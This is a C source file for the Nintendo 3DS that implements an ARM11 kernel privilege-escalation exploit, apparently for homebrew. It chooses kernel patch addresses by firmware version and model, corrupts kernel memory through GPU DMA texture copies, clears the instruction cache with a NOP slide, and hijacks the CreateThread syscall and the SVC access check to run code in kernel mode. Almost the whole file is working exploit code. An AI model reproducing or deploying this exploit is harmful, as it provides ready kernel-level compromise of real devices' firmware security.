#include <3ds.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <malloc.h>
#include <dirent.h>

u32 nop_slide[0x1000] __attribute__((aligned(0x1000)));
unsigned int patch_addr;
unsigned int svc_patch_addr;
unsigned int kversion;
u8 isN3DS = 0;
u32 *backup;
unsigned int *arm11_buffer;

//Uncomment to have progress printed w/ printf
#define DEBUG_PROCESS

int do_gshax_copy(void *dst, void *src, unsigned int len, unsigned int check_val, int check_off)
{
    unsigned int result;

    do
    {
        GSPGPU_FlushDataCache (NULL, src, len);
        GX_SetTextureCopy(NULL, src, 0, dst, 0, len, 8);
        GSPGPU_FlushDataCache (NULL, 0x14401000, 16);
        GX_SetTextureCopy(NULL, src, 0, 0x14401000, 0, 0x40, 8);
        result = *(unsigned int *)(0x14401000 + check_off);
    } while (result != check_val);

    return 0;
}

int arm11_kernel_exploit_setup(void)
{
    unsigned int *test;
    int i;
    int (*nop_func)(void);
    int *ipc_buf;
    int model;

    // get proper patch address for our kernel -- thanks yifanlu once again
    kversion = *(unsigned int *)0x1FF80000; // KERNEL_VERSION register
    patch_addr = 0;
    svc_patch_addr = 0;
    APT_CheckNew3DS(NULL, &isN3DS);

    if(!isN3DS)
    {
    
        if (kversion == 0x02220000) // 2.34-0 4.1.0
        {
            patch_addr = 0xEFF83C97;
        }
        else if (kversion == 0x02230600) // 2.35-6 5.0.0
        {
            patch_addr = 0xEFF8372F;
        }
        else if (kversion == 0x02240000 || kversion == 0x02250000 || kversion == 0x02260000) // 2.36-0 5.1.0, 2.37-0 6.0.0, 2.38-0 6.1.0
        {
            patch_addr = 0xEFF8372B;
        }
        else if (kversion == 0x02270400) // 2.39-4 7.0.0
        {
            patch_addr = 0xEFF8372F;
        }
        else if (kversion == 0x02280000) // 2.40-0 7.2.0
        {
            patch_addr = 0xEFF8372B;
        }
        else if (kversion == 0x022C0600 || kversion == 0x022E0000) // 2.44-6 8.0.0, 2.26-0 9.0.0
        {
            patch_addr = 0xDFF83837;
            svc_patch_addr = 0xDFF82290;
        }
        else
        {
#ifdef DEBUG_PROCESS
            printf("Unrecognized kernel version %x, returning...\n", kversion);
#endif
            return 0;
        }
    }
    else
    {
        if (kversion == 0x022C0600 || kversion == 0x022E0000) // N3DS 2.44-6 8.0.0, N3DS 2.26-0 9.0.0
        {
            patch_addr = 0xDFF8382F;
            svc_patch_addr = 0xDFF82260;
        }
        else
        {
#ifdef DEBUG_PROCESS
            printf("Unrecognized kernel version %x, returning...\n", kversion);
#endif
            return 0;
        }
    }
#ifdef DEBUG_PROCESS
    printf("Loaded adr %x for kernel %x\n", patch_addr, kversion); 
#endif

    // part 1: corrupt kernel memory
    // 0xFFFFFE0 is just stack memory for scratch space
    svcControlMemory(0xFFFFFE0, 0x14411000, 0, 0x1000, 1, 0); // free page 

    arm11_buffer[0] = 1;
    arm11_buffer[1] = patch_addr;
    arm11_buffer[2] = 0;
    arm11_buffer[3] = 0;

    // overwrite free pointer
#ifdef DEBUG_PROCESS
    printf("Overwriting free pointer\n");
#endif

    //Trigger write to kernel
    do_gshax_copy(0x14411000, arm11_buffer, 0x10u, patch_addr, 4);
    svcControlMemory(0xFFFFFE0, 0x14410000, 0, 0x1000, 1, 0);

#ifdef DEBUG_PROCESS
    printf("Triggered kernel write\n");
    gfxFlushBuffers();
    gfxSwapBuffers();
#endif

     // part 2: trick to clear icache
    for (i = 0; i < 0x1000; i++)
    {
        arm11_buffer[i] = 0xE1A00000; // ARM NOP instruction
    }
    arm11_buffer[i-1] = 0xE12FFF1E; // ARM BX LR instruction
    nop_func = nop_slide;

    do_gshax_copy(nop_slide, arm11_buffer, 0x10000, 0xE1A00000, 0);

    HB_FlushInvalidateCache();
    nop_func();

#ifdef DEBUG_PROCESS
    printf("Exited nop slide\n");
    gfxFlushBuffers();
    gfxSwapBuffers();
#endif

    return 1;
}

// after running setup, run this to execute func in ARM11 kernel mode
int __attribute__((naked))
arm11_kernel_exploit_exec (int (*func)(void))
{
    __asm__ ("svc 8\t\n" // CreateThread syscall, corrupted, args not needed
             "bx lr\t\n");
}

int __attribute__((naked))
arm11_kernel_execute(int (*func)(void))
{
    __asm__ ("svc #0x7B\t\n"
             "bx lr\t\n");
}

void test(void)
{
	arm11_buffer[0] = 0xFAAFFAAF;
}

void
invalidate_icache (void)
{
    __asm__ ("mcr p15,0,%0,c7,c5,0\t\n"
             "mcr p15,0,%0,c7,c5,4\t\n"
             "mcr p15,0,%0,c7,c5,6\t\n"
             "mcr p15,0,%0,c7,c10,4\t\n" :: "r" (0));
}

void
invalidate_dcache (void)
{
    __asm__ ("mcr p15,0,%0,c7,c14,0\t\n"
             "mcr p15,0,%0,c7,c10,4\t\n" :: "r" (0));
}

void
invalidate_allcache (void)
{
    __asm__ ("mcr p15,0,%0,c8,c5,0\t\n"
             "mcr p15,0,%0,c8,c6,0\t\n"
             "mcr p15,0,%0,c8,c7,0\t\n"
             "mcr p15,0,%0,c7,c10,4\t\n" :: "r" (0));
}

int __attribute__((noinline))
arm11_kernel_exec (void)
{
    arm11_buffer[0] = 0xF00FF00F;

    // fix up memory
    *(int *)(patch_addr+2) = 0x8DD00CE5;

    // give us access to all SVCs (including 0x7B, so we can return to kernel mode) 
    // THIS OFFSET IS SPECIFIC TO N3DS
    if(svc_patch_addr > 0)
    {
        *(int *)(svc_patch_addr) = 0xE320F000; //NOP
        *(int *)(svc_patch_addr+8) = 0xE320F000; //NOP
    }
    invalidate_icache ();
    invalidate_allcache ();
    invalidate_dcache ();

    return 0;
}

int __attribute__((naked))
arm11_kernel_stub (void)
{
    __asm__ ("add sp, sp, #8\t\n");

    arm11_kernel_exec ();

    __asm__ ("movs r0, #0\t\n"
             "ldr pc, [sp], #4\t\n");
}

int doARM11Hax()
{
    int result = 0;
    int i;
    int (*nop_func)(void);
    HB_ReprotectMemory(0x14400000, 0x30000 / 4096, 7, &result);
    HB_ReprotectMemory(nop_slide, 4, 7, &result);

    for (i = 0; i < 0x1000; i++)
    {
        nop_slide[i] = 0xE1A00000; // ARM NOP instruction
    }
    nop_slide[i-1] = 0xE12FFF1E; // ARM BX LR instruction
    nop_func = nop_slide;
    HB_FlushInvalidateCache();

#ifdef DEBUG_PROCESS
    printf("Testing nop slide\n");
#endif

    nop_func();

#ifdef DEBUG_PROCESS
    printf("Exited nop slide\n");
#endif

    unsigned int addr;
    void *this = 0x08F10000;
    int *written = 0x08F01000;
    arm11_buffer = linearMemAlign(0x10000, 0x10000);

    // wipe memory for debugging purposes
    for (i = 0; i < 0x1000/4; i++)
    {
        arm11_buffer[i] = 0xdeadbeef;
    }

    if(arm11_kernel_exploit_setup())
    {

#ifdef DEBUG_PROCESS
        printf("Kernel exploit set up, \nExecuting code under ARM11 Kernel...\n");
#endif

        arm11_kernel_exploit_exec (arm11_kernel_stub);
        if(svc_patch_addr > 0)
            arm11_kernel_execute (test);

#ifdef DEBUG_PROCESS
        printf("ARM11 Kernel Code Executed\n");
#endif

    }
#ifdef DEBUG_PROCESS
    else
    {
        printf("Kernel exploit set up failed!\n");
    }
#endif

    return 0;
}
